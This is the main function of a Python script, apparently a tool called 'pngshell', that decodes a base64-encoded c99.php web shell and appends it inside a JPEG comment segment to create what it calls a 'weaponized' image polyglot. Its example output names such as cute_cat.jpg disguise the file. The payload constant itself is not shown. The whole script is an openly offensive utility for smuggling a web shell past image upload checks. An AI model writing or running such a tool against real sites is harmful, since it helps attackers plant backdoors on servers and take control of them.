def main():
    parser = argparse.ArgumentParser(
        description="pngshell - Turn c99.php into weaponized JPEG polyglot\nMade By Taylor Christian Newsome",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Examples:\n"
               "  pngshell -o evil.jpg\n"
               "  pngshell --output cute_cat.jpg --quality 85"
    )

    parser.add_argument(
        "-o", "--output",
        default="c99_evil.jpg",
        help="output filename (default: c99_evil.jpg)"
    )

    parser.add_argument(
        "-q", "--quality",
        type=int,
        default=92,
        choices=range(10, 101),
        metavar="[10-100]",
        help="JPEG quality 10-100 (default: 92)"
    )

    parser.add_argument(
        "--version",
        action="version",
        version="pngshell 1.0 - Made By Taylor Christian Newsome"
    )

    args = parser.parse_args()

    print("═══ pngshell - C99 JPEG Weaponizer ═══")
    print("Made By Taylor Christian Newsome\n")

    # Decode payload
    try:
        payload = base64.b64decode(C99_BASE64)
    except Exception as e:
        print(f"[-] Base64 decode failed: {e}", file=sys.stderr)
        return 1

    print(f"[+] Payload ready — {len(payload):,} bytes")

    # Create innocent looking tiny image
    img = Image.new('RGB', (666, 420), color=(66, 13, 37))

    # Save JPEG in memory
    buf = io.BytesIO()
    img.save(buf, format="JPEG", quality=args.quality)
    jpeg_bytes = buf.getvalue()

    # Polyglot magic: JPEG + comment section + payload
    evil = (
        jpeg_bytes.rstrip(b'\xFF\xD9') +
        b'\xFF\xFE' +
        len(payload).to_bytes(2, 'big') +
        payload +
        b'\xFF\xD9'
    )

    # Write result
    try:
        with open(args.output, "wb") as f:
            f.write(evil)
        print(f"[√] Success! Weaponized file created:")
        print(f"    → {os.path.abspath(args.output)}")
        print(f"    Size: {os.path.getsize(args.output):,} bytes")
        print(f"    Quality: {args.quality}")
        return 0
    except Exception as e:
        print(f"[-] Failed to write file: {e}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
